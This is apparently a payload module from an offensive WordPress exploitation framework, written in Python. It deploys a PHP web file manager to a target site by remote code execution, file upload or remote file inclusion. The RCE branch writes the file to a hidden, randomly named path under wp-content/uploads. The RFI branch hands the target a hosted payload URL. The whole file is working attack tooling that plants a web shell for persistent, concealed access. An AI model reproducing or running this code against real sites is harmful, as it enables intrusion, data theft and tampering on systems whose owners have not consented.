"""
HWP Payload — File Browser

Deploys a web-based PHP file browser to the target.

Delivery methods:
    RCE  — Write file browser via PHP code execution
    AFU  — Provide file content for direct upload
    RFI  — Provide URL to hosted file browser

Options:
    --path      Upload path (default: random in wp-content/uploads)
"""

import random
import string
from pathlib import Path

from hwp import Payload

_DIR = Path(__file__).parent
FILEBROWSER_PHP = (_DIR / "filebrowser.php").read_text(encoding="utf-8")

# Hosted payload URL for RFI delivery
FILEBROWSER_RFI_URL = "https://raw.githubusercontent.com/etragardh/hackwp/main/payloads/filebrowser/filebrowser.php"


def _rand(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


class FileBrowser(Payload):
    name = "File Browser"
    methods = ["RCE", "AFU", "RFI"]
    description = "Deploy web-based file manager (browse, view, edit, create, delete + syntax highlighting)"
    options = [
        {"name": "path", "default": "", "help": "Upload path (blank = random)", "methods": ["RCE"]},
    ]

    def instructions(self):
        if self.method == "RCE":
            path = self.options.get("path", "")
            if not path:
                path = f"wp-content/uploads/.{_rand()}.php"

            self._rce_path = path
            self.info(f"Deploying file browser to: {path}")

            escaped = FILEBROWSER_PHP.replace("\\", "\\\\").replace("'", "\\'")

            php = (
                f"<?php "
                f"$f = ABSPATH . '{path}'; "
                f"@mkdir(dirname($f), 0755, true); "
                f"file_put_contents($f, '{escaped}'); "
                f"echo file_exists($f) ? 'FB_DEPLOYED' : 'FB_FAILED'; "
                f"?>"
            )
            return [php]

        elif self.method == "AFU":
            self.info("Providing file browser for upload")
            return [FILEBROWSER_PHP]

        elif self.method == "RFI":
            self.info(f"Providing hosted URL: {FILEBROWSER_RFI_URL}")
            return [FILEBROWSER_RFI_URL]

    def report(self, results):
        for r in results:
            if not r.success:
                self.error("File browser deployment failed")
                continue

            if self.method == "RCE":
                if r.output and "FB_DEPLOYED" in str(r.output):
                    self.success("File browser deployed!")
                    self.info(f"Open in browser: {self.target}/{self._rce_path}")
                else:
                    self.error("File browser deployment failed")

            elif self.method in ("AFU", "RFI"):
                if r.url:
                    self.success("File browser uploaded!")
                    self.info(f"Open in browser: {r.url}")
                elif r.path:
                    self.success("File browser uploaded!")
                    self.info(f"Uploaded to: {r.path}")
                else:
                    self.success("File browser uploaded (check exploit output for location)")
